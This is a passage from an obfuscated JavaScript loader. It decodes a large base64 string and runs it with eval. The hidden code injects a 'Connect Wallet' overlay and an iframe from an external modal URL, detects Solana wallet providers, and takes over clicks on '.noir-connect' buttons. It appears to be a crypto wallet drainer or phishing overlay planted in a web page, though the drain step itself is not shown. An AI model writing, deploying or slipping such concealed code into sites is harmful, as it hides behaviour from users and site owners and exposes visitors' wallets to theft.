C1oaWdobGlnaHQtY29sb3I6dHJhbnNwYXJlbnR9JyArCiAgICAgICcubndwLWNsb3NlOmFjdGl2ZXtiYWNrZ3JvdW5kOnJnYmEoMjU1LDI1NSwyNTUsMC4xKX0nICsKICAgICAgJy5ud3AtbGlzdHtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2dhcDo0cHh9JyArCiAgICAgICcubndwLXdhbGxldHtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxMnB4O3BhZGRpbmc6MTBweCAxMnB4O2JhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwwLjAyKTtib3JkZXItcmFkaXVzOjEycHg7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Y29sb3I6I2U0ZTdlNztmb250OjUwMCAxNHB4LzEgS0hUZWthLHN5c3RlbS11aSwtYXBwbGUtc3lzdGVtLHNhbnMtc2VyaWY7LXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOnRyYW5zcGFyZW50O3RyYW5zaXRpb246YmFja2dyb3VuZCAuMTVzfScgKwogICAgICAnLm53cC13YWxsZXQ6YWN0aXZle2JhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwwLjA2KX0nICsKICAgICAgJy5ud3Atd2ljb257d2lkdGg6MzZweDtoZWlnaHQ6MzZweDtib3JkZXItcmFkaXVzOjhweDtmbGV4LXNocmluazowO29iamVjdC1maXQ6Y292ZXJ9JyArCiAgICAgICcubndwLXduYW1le2ZsZXg6MX0nICsKICAgICAgJy5ud3AtdGFne2ZvbnQ6NTAwIDEwcHgvMSBLSFRla2Esc3lzdGVtLXVpLHNhbnMtc2VyaWY7Y29sb3I6IzI2ZDk2MjtiYWNrZ3JvdW5kOnJnYmEoMzgsMjE3LDk4LDAuMTIpO3BhZGRpbmc6M3B4IDZweDtib3JkZXItcmFkaXVzOjIwcHg7bGV0dGVyLXNwYWNpbmc6MC4wMmVtO3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZX0nICsKICAgICAgJy5ud3AtY2hldnJvbntjb2xvcjpyZ2JhKDIyOCwyMzEsMjMxLDAuMyk7Zm9udC1zaXplOjE0cHg7bWFyZ2luLWxlZnQ6NHB4fScgKwogICAgICAnQGtleWZyYW1lcyBud3AtZmFkZXtmcm9te29wYWNpdHk6MH10b3tvcGFjaXR5OjF9fScgKwogICAgICAnQGtleWZyYW1lcyBud3Atc2xpZGV7ZnJvbXt0cmFuc2Zvcm06dHJhbnNsYXRlWSgxMDAlKX10b3t0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKX19JyArCiAgICAgICc8L3N0eWxlPic7CgogICAgdmFyIHdhbGxldHNIVE1MID0gJyc7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHdhbGxldHMubGVuZ3RoOyBpKyspIHsKICAgICAgdmFyIHcgPSB3YWxsZXRzW2ldOwogICAgICB2YXIgdGFnSFRNTCA9IHcudGFnID8gJzxzcGFuIGNsYXNzPSJud3AtdGFnIj4nICsgdy50YWcgKyAnPC9zcGFuPicgOiAnJzsKICAgICAgd2FsbGV0c0hUTUwgKz0gJzxhIGNsYXNzPSJud3Atd2FsbGV0IiBocmVmPSInICsgdy51cmwgKyAnIj4nICsKICAgICAgICAnPGltZyBjbGFzcz0ibndwLXdpY29uIiBzcmM9IicgKyB3LmltZyArICciIGFsdD0iIiAvPicgKwogICAgICAgICc8c3BhbiBjbGFzcz0ibndwLXduYW1lIj4nICsgdy5uYW1lICsgJzwvc3Bhbj4nICsKICAgICAgICB0YWdIVE1MICsKICAgICAgICAnPHNwYW4gY2xhc3M9Im53cC1jaGV2cm9uIj7igLo8L3NwYW4+JyArCiAgICAgICAgJzwvYT4nOwogICAgfQoKICAgIHZhciBwaWNrZXJEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIHBpY2tlckRpdi5pZCA9ICdub2lyV2FsbGV0UGlja2VyJzsKICAgIHBpY2tlckRpdi5pbm5lckhUTUwgPSBwaWNrZXJDU1MgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLW92ZXJsYXkiPicgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLWNhcmQiPicgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLWhlYWRlciI+JyArCiAgICAgICc8c3BhbiBjbGFzcz0ibndwLXRpdGxlIj5Db25uZWN0IFdhbGxldDwvc3Bhbj4nICsKICAgICAgJzxidXR0b24gY2xhc3M9Im53cC1jbG9zZSI+4pyVPC9idXR0b24+JyArCiAgICAgICc8L2Rpdj4nICsKICAgICAgJzxkaXYgY2xhc3M9Im53cC1saXN0Ij4nICsgd2FsbGV0c0hUTUwgKyAnPC9kaXY+JyArCiAgICAgICc8L2Rpdj48L2Rpdj4nOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwaWNrZXJEaXYpOwoKICAgIHZhciBvdmVybGF5RWwgPSBwaWNrZXJEaXYucXVlcnlTZWxlY3RvcignLm53cC1vdmVybGF5Jyk7CiAgICB2YXIgY2xvc2VFbCA9IHBpY2tlckRpdi5xdWVyeVNlbGVjdG9yKCcubndwLWNsb3NlJyk7CiAgICBpZiAob3ZlcmxheUVsKSB7CiAgICAgIG92ZXJsYXlFbC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGV2KSB7CiAgICAgICAgaWYgKGV2LnRhcmdldCA9PT0gb3ZlcmxheUVsKSBwaWNrZXJEaXYucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChwaWNrZXJEaXYpOwogICAgICB9KTsKICAgIH0KICAgIGlmIChjbG9zZUVsKSB7CiAgICAgIGNsb3NlRWwuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsKICAgICAgICBwaWNrZXJEaXYucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChwaWNrZXJEaXYpOwogICAgICB9KTsKICAgIH0KICB9CgogIC8vIERldGVjdCBtb2JpbGUgZGV2aWNlCiAgLy8gTW9iaWxlIGRldGVjdGlvbiDigJQgaW5jbHVkZXMgaVBhZE9TIDEzKyAocmVwb3J0cyBhcyBNYWNpbnRvc2ggYnV0IGhhcyB0b3VjaCkKICB2YXIgX19pc01vYmlsZSA9IC9BbmRyb2lkfHdlYk9TfGlQaG9uZXxpUGFkfGlQb2R8QmxhY2tCZXJyeXxJRU1vYmlsZXxPcGVyYSBNaW5pL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KSB8fAogICAgKG5hdmlnYXRvci5tYXhUb3VjaFBvaW50cyA+IDEgJiYgL01hY2ludG9zaC9pLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCkpOwogIC8vIERldGVjdCB3YWxsZXQgaW4tYXBwIGJyb3dzZXIgKHByb3ZpZGVyIGFscmVhZHkgaW5qZWN0ZWQgPSBubyByZWRpcmVjdCBuZWVkZWQpCiAgdmFyIF9faXNXYWxsZXRCcm93c2VyID0gISEod2luZG93LnBoYW50b20/LnNvbGFuYT8uaXNQaGFudG9tIHx8IHdpbmRvdy5zb2xhbmE/LmlzUGhhbnRvbSB8fAogICAgd2luZG93LnNvbGZsYXJlPy5pc1NvbGZsYXJlIHx8IHdpbmRvdy5Tb2xmbGFyZUFwcCB8fAogICAgd2luZG93LmJhY2twYWNrPy5pc0JhY2twYWNrIHx8IHdpbmRvdy5jb2luYmFzZVNvbGFuYSB8fAogICAgd2luZG93LnRydXN0d2FsbGV0Py5zb2xhbmEpOwoKICBmdW5jdGlvbiBpbml0KCkgewogICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoJ2JlZm9yZWVuZCcsIG1vZGFsSFRNTCk7CiAgICB2YXIgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lyTW9kYWxPdmVybGF5Jyk7CiAgICB2YXIgaWZyYW1lID0gb3ZlcmxheSA/IG92ZXJsYXkucXVlcnlTZWxlY3RvcignLm5vaXItbW9kYWwtaWZyYW1lJykgOiBudWxsOwogICAgZnVuY3Rpb24gc2hvd01vZGFsKCkgewogICAgICBvdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7IG92ZXJsYXkuY2xhc3NMaXN0LmFkZCgnbm9pci1hY3RpdmUnKTsgfSwgMTApOwogICAgICBpZiAoaWZyYW1lICYmIGlmcmFtZS5jb250ZW50V2luZG93KSB7CiAgICAgICAgdHJ5IHsgaWZyYW1lLmNvbnRlbnRXaW5kb3cucG9zdE1lc3NhZ2UoeyB0eXBlOiAnbm9pck1vZGFsT3BlbicgfSwgJyonKTsgfSBjYXRjaCAoXykge30KICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGhpZGVNb2RhbCgpIHsKICAgICAgb3ZlcmxheS5jbGFzc0xpc3QucmVtb3ZlKCdub2lyLWFjdGl2ZScpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgeyBvdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7IH0sIDMwMCk7CiAgICB9CgogICAgLy8gRW5zdXJlIC5ub2lyLWNvbm5lY3QgZWxlbWVudHMgcmVzcG9uZCBpbnN0YW50bHkgb24gbW9iaWxlIChubyAzMDBtcyB0YXAgZGVsYXkpCiAgICB0cnkgewogICAgICB2YXIgdG91Y2hTdHlsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3N0eWxlJyk7CiAgICAgIHRvdWNoU3R5bGUudGV4dENvbnRlbnQgPSAnLm5vaXItY29ubmVjdHt0b3VjaC1hY3Rpb246bWFuaXB1bGF0aW9uOy13ZWJraXQtdGFwLWhpZ2hsaWdodC1jb2xvcjp0cmFuc3BhcmVudH0nOwogICAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHRvdWNoU3R5bGUpOwogICAgfSBjYXRjaChfKSB7fQoKICAgIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdtZXNzYWdlJywgZnVuY3Rpb24oZSkgewogICAgICBpZiAoIWUuZGF0YSB8fCB0eXBlb2YgZS5kYXRhLnR5cGUgIT09ICdzdHJpbmcnKSByZXR1cm47CiAgICAgIGlmIChlLmRhdGEudHlwZSA9PT0gJ25vaXJNb2RhbENsb3NlJykgeyBoaWRlTW9kYWwoKTsgcmV0dXJuOyB9CiAgICAgIGlmIChlLmRhdGEudHlwZSA9PT0gJ25vaXJNb2RhbFJlc2l6ZScgJiYgdHlwZW9mIGUuZGF0YS5oZWlnaHQgPT09ICdudW1iZXInICYmIGlmcmFtZSkgewogICAgICAgIHZhciBtaW5IID0gNDAwOwogICAgICAgIHZhciBtYXhIID0gTWF0aC5taW4od2luZG93LmlubmVySGVpZ2h0ICogMC45MiwgOTAwKTsKICAgICAgICB2YXIgaCA9IE1hdGgubWF4KG1pbkgsIE1hdGgubWluKG1heEgsIE1hdGgucm91bmQoZS5kYXRhLmhlaWdodCkpKTsKICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gaCArICdweCc7CiAgICAgIH0KICAgIH0pOwoKICAgIGZ1bmN0aW9uIGhhbmRsZU5vaXJDb25uZWN0KCkgewogICAgICBpZiAoX19pc01vYmlsZSAmJiAhX19pc1dhbGxldEJyb3dzZXIpIHsKICAgICAgICBzaG93TW9iaWxlV2FsbGV0UGlja2VyKCk7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIGlmIChfX2lzTW9iaWxlICYmIF9faXNXYWxsZXRCcm93c2VyKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBNT0RBTF9VUkwgKyAnJmF1dG9jb25uZWN0PTEnOwogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBzaG93TW9kYWwoKTsKICAgIH0KCiAgICBmdW5jdGlvbiBmaW5kTm9pckNvbm5lY3QoZWwpIHsKICAgICAgd2hpbGUgKGVsICYmIGVsICE9PSBkb2N1bWVudCkgewogICAgICAgIGlmIChlbC5jbGFzc0xpc3QgJiYgZWwuY2xhc3NMaXN0LmNvbnRhaW5zKCdub2lyLWNvbm5lY3QnKSkgcmV0dXJuIGVsOwogICAgICAgIGVsID0gZWwucGFyZW50RWxlbWVudDsKICAgICAgfQogICAgICByZXR1cm4gbnVsbDsKICAgIH0KCiAgICAvLyBFdmVudCBkZWxlZ2F0aW9uIOKAlCB3b3JrcyB3aXRoIFJlYWN0LCBWdWUsIEFuZ3VsYXIsIGFueSBTUEEgZnJhbWV3b3JrLgogICAgLy8gSW5zdGVhZCBvZiBzY2FubmluZyBET00gb25jZSAoYnJlYWtzIHdoZW4gU1BBIHJlLXJlbmRlcnMgYW5kIHJlcGxhY2VzIG5vZGVzKSwKICAgIC8vIHdlIGxpc3RlbiBvbiBkb2N1bWVudCBhbmQgbWF0Y2ggY2xpY2tzIG9uIC5ub2lyLWNvbm5lY3QgZWxlbWVudHMuCiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGUpIHsKICAgICAgaWYgKGZpbmROb2lyQ29ubmVjdChlLnRhcmdldCkpIHsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgZS5zdG9wUHJvcGFnYXRpb24oKTsKICAgICAgICBoYW5kbGVOb2lyQ29ubmVjdCgpOwogICAgICB9CiAgICB9LCB0cnVlKTsKCiAgICAvLyBNb2JpbGUgYmFja3VwOiB0b3VjaGVuZCBmaXJlcyBpbW1lZGlhdGVseSAobm8gMzAwbXMgZGVsYXkgbGlrZSBjbGljaykuCiAgICAvLyBQcmV2ZW50cyBtaXNzZWQgdGFwcyB3aGVuIFJlYWN0IHJlLXJlbmRlcnMgYmV0d2VlbiB0b3VjaHN0YXJ0IGFuZCBjbGljay4KICAgIGlmIChfX2lzTW9iaWxlKSB7CiAgICAgIHZhciBfdG91Y2hTdGFydFggPSAwLCBfdG91Y2hTdGFydFkgPSAwLCBfdG91Y2hUYXJnZXQgPSBudWxsOwogICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCd0b3VjaHN0YXJ0JywgZnVuY3Rpb24oZSkgewogICAgICAgIF90b3VjaFRhcmdldCA9IGUudGFyZ2V0OwogICAgICAgIF90b3VjaFN0YXJ0WCA9IGUudG91Y2hlc1swXS5jbGllbnRYOwogICAgICAgIF90b3VjaFN0YXJ0WSA9IGUudG91Y2hlc1swXS5jbGllbnRZOwogICAgICB9LCB7IGNhcHR1cmU6IHRydWUsIHBhc3NpdmU6IHRydWUgfSk7CgogICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCd0b3VjaGVuZCcsIGZ1bmN0aW9uKGUpIHsKICAgICAgICBpZiAoIV90b3VjaFRhcmdldCkgcmV0dXJuOwogICAgICAgIHZhciBkeCA9IGUuY2hhbmdlZFRvdWNoZXNbMF0uY2xpZW50WCAtIF90b3VjaFN0YXJ0WDsKICAgICAgICB2YXIgZHkgPSBlLmNoYW5nZWRUb3VjaGVzWzBdLmNsaWVudFkgLSBfdG91Y2hTdGFydFk7CiAgICAgICAgLy8gT25seSB0cmVhdCBhcyB0YXAgaWYgZmluZ2VyIG1vdmVkIGxlc3MgdGhhbiAxMHB4IChub3QgYSBzY3JvbGwpCiAgICAgICAgaWYgKE1hdGguYWJzKGR4KSA+IDEwIHx8IE1hdGguYWJzKGR5KSA+IDEwKSByZXR1cm47CiAgICAgICAgaWYgKGZpbmROb2lyQ29ubmVjdChfdG91Y2hUYXJnZXQpKSB7CiAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICBoYW5kbGVOb2lyQ29ubmVjdCgpOwogICAgICAgIH0KICAgICAgICBfdG91Y2hUYXJnZXQgPSBudWxsOwogICAgICB9LCB0cnVlKTsKICAgIH0KCiAgICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZSkgewogICAgICBpZiAoZS50YXJnZXQgPT09IG92ZXJsYXkpIHsgaGlkZU1vZGFsKCk7IH0KICAgIH0pOwoKICAgIHZhciB1cmxQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOwogICAgaWYgKHVybFBhcmFtcy5nZXQoJ3Nob3dGcmFtZScpID09PSAndHJ1ZScpIHsgc2hvd01vZGFsKCk7IH0KCiAgICB3aW5kb3cubm9pckNvbm5lY3QgPSBmdW5jdGlvbigpIHsgaGFuZGxlTm9pckNvbm5lY3QoKTsgfTsKICB9CgogIGlmIChkb2N1bWVudC5yZWFkeVN0YXRlID09PSAnbG9hZGluZycpIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBpbml0KTsKICB9IGVsc2UgewogICAgaW5pdCgpOwogIH0KfQoKYm9vdCgpOwp9KSgpOw==");var _0x6h4cl5=decodeURIComponent(escape(_0xzc4gy3));eval(_0x6h4cl5)})();